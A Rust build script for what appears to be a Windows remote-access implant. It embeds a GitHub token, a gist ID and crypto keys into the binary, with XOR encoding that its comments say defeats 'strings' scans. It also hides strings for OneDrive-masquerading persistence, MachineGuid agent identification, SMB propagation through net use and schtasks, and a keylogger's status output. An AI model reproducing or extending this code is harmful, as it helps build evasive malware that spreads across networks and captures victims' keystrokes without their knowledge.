use std::env;
use std::fs;
use std::path::Path;

/// XOR-obfuscate bytes with a repeating key.
/// The key itself is baked in here at compile time — not a secret, just
/// enough to prevent the plaintext from appearing as a contiguous string
/// in the binary (defeats simple `strings` scans).
fn xor_encode(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, b)| b ^ key[i % key.len()])
        .collect()
}

/// Emit a `cargo:rustc-env` line and a matching `include!`-ready `.rs`
/// snippet that exposes the obfuscated bytes as a `&[u8]` constant.
///
/// We write the constants into `OUT_DIR/embedded_secrets.rs` which
/// `main.rs` will pull in via `include!(concat!(env!("OUT_DIR"), "/embedded_secrets.rs"))`.
fn main() {
    // ── 1. Collect secrets ───────────────────────────────────────────────────

    // GITHUB_TOKEN  – must be passed as env var at `cargo build` time
    let github_token = env::var("GITHUB_TOKEN")
        .expect("GITHUB_TOKEN must be set at build time");
    if github_token.trim().is_empty() {
        panic!("GITHUB_TOKEN is empty! Please pass it as a build argument.");
    }

    // GIST_ID – must be passed as env var at `cargo build` time
    let gist_id = env::var("GIST_ID").expect("GIST_ID must be set at build time");
    if gist_id.trim().is_empty() {
        panic!("GIST_ID is empty! Please pass it as a build argument.");
    }

    // public_key.pem – read from the file next to Cargo.toml
    let manifest_dir = env::var("CARGO_MANIFEST_DIR").unwrap();
    let pub_key_path = Path::new(&manifest_dir).join("public_key.pem");
    let public_key_pem = fs::read_to_string(&pub_key_path)
        .unwrap_or_else(|_| panic!("Cannot read {:?} at build time", pub_key_path));

    // aes_key.txt – hex string, one line
    let aes_key_path = Path::new(&manifest_dir).join("aes_key.txt");
    let aes_key_hex = fs::read_to_string(&aes_key_path)
        .unwrap_or_else(|_| panic!("Cannot read {:?} at build time", aes_key_path))
        .trim()
        .to_string();

    // ── 2. XOR key (hard-coded, non-secret obfuscation key) ──────────────────
    // 32 arbitrary bytes — change freely, they are compiled into the binary.
    let xor_key: &[u8] = &[
        0x4B, 0x7E, 0x23, 0xA1, 0xF0, 0x55, 0xCC, 0x39, 0x82, 0x1D, 0xBB, 0x6F, 0x04, 0xE8, 0x97,
        0x3A, 0xD6, 0x51, 0x0C, 0x78, 0x2E, 0xB4, 0x9F, 0x61, 0xAA, 0x33, 0x5D, 0xE2, 0x17, 0x8C,
        0x46, 0xF9,
    ];

    let enc_token = xor_encode(github_token.as_bytes(), xor_key);
    let enc_gist_id = xor_encode(gist_id.as_bytes(), xor_key);
    let enc_pub_key = xor_encode(public_key_pem.as_bytes(), xor_key);
    let enc_aes_hex = xor_encode(aes_key_hex.as_bytes(), xor_key);

    // ── 3. Write embedded_secrets.rs into OUT_DIR ────────────────────────────
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("embedded_secrets.rs");

    let mut src = String::new();

    // XOR key constant
    src.push_str(&format!("pub const XOR_KEY: &[u8] = &{:?};\n", xor_key));

    // Obfuscated secret constants
    for (name, bytes) in &[
        ("ENC_GITHUB_TOKEN",  &enc_token),
        ("ENC_GIST_ID",       &enc_gist_id),
        ("ENC_PUBLIC_KEY",    &enc_pub_key),
        ("ENC_AES_KEY_HEX",  &enc_aes_hex),
    ] {
        src.push_str(&format!("pub const {}: &[u8] = &{:?};\n", name, bytes));
    }

    // ── 4. Obfuscated IOC strings (persistence / agent-ID) ──────────────────
    let ioc_strings: &[(&str, &str)] = &[
        // persistence — Windows copy destination (OneDrive folder)
        ("ENC_DEST_ENV_VAR",      "LOCALAPPDATA"),
        ("ENC_DEST_DIR_SUFFIX",   "Microsoft\\OneDrive"),
        ("ENC_EXE_NAME",          "OneDriveUpdater.exe"),
        // persistence — Startup folder shortcut
        ("ENC_STARTUP_ENV",       "APPDATA"),
        ("ENC_STARTUP_SUBDIR",    "Microsoft\\Windows\\Start Menu\\Programs\\Startup"),
        ("ENC_LNK_NAME",          "OneDrive Update.lnk"),
        // agent-ID — Windows MachineGuid
        ("ENC_REG_CMD",           "reg"),
        ("ENC_MACHINE_GUID_KEY",  "HKLM\\SOFTWARE\\Microsoft\\Cryptography"),
        ("ENC_MACHINE_GUID_VAL",  "MachineGuid"),
        // SMB propagation — high-signal IOC strings
        ("ENC_NET_CMD",           "net"),
        ("ENC_NET_USE_ARG",       "use"),
        ("ENC_SCHTASKS_CMD",      "schtasks"),
        ("ENC_TASK_NAME",         "OneDriveUpdate"),
        ("ENC_SC_CREATE",         "/create"),
        ("ENC_SC_RUN",            "/run"),
        ("ENC_SC_DELETE",         "/delete"),
        ("ENC_SC_S",              "/s"),
        ("ENC_SC_TN",             "/tn"),
        ("ENC_SC_TR",             "/tr"),
        ("ENC_SC_SC",             "/sc"),
        ("ENC_SC_ST",             "/st"),
        ("ENC_SC_F",              "/f"),
        ("ENC_SC_U",              "/u"),
        ("ENC_SC_P",              "/p"),
        ("ENC_SC_ONCE",           "ONCE"),
        ("ENC_SC_TIME",           "00:00"),
        // keylogger — file name
        ("ENC_KEYLOG_FILE",        "keylog.txt"),
        // keylogger — status/log strings
        ("ENC_KL_ALREADY_RUNNING", "Keylogger is already running"),
        ("ENC_KL_STARTING",        "[+] Starting keylogger..."),
        ("ENC_KL_HOOK_INSTALLED",  "[+] Keylogger hook installed"),
        ("ENC_KL_HOOK_REMOVED",    "[+] Keylogger hook removed"),
        ("ENC_KL_HOOK_FAILED",     "[-] Failed to set keyboard hook. Error: "),
        ("ENC_KL_STARTED",         "Keylogger started successfully"),
        ("ENC_KL_NOT_RUNNING",     "Keylogger is not running"),
        ("ENC_KL_STOPPING",        "[+] Stopping keylogger..."),
        ("ENC_KL_STOPPED",         "Keylogger stopped successfully"),
        ("ENC_KL_DUMP_HDR",        "=== KEYLOGGER DUMP ==="),
        ("ENC_KL_DUMP_SEP",        "--- Captured Keys ---"),
        ("ENC_KL_DUMP_END",        "=== END OF DUMP ==="),
        ("ENC_KL_FILE_EMPTY",      "Keylog file is empty"),
        ("ENC_KL_FILE_ERR",        "Keylog file not found or cannot be read"),
        ("ENC_KL_UNAVAILABLE",     "Keylogger is only available on Windows"),
    ];
    for (name, plaintext) in ioc_strings {
        let enc = xor_encode(plaintext.as_bytes(), xor_key);
        src.push_str(&format!("pub const {}: &[u8] = &{:?};\n", name, enc));
    }
    fs::write(&dest, src).expect("Failed to write embedded_secrets.rs");

    // ── 4. Tell Cargo to re-run this script when secrets change ──────────────
    println!("cargo:rerun-if-env-changed=GITHUB_TOKEN");
    println!("cargo:rerun-if-env-changed=GIST_ID");
    println!("cargo:rerun-if-changed=public_key.pem");
    println!("cargo:rerun-if-changed=aes_key.txt");
}
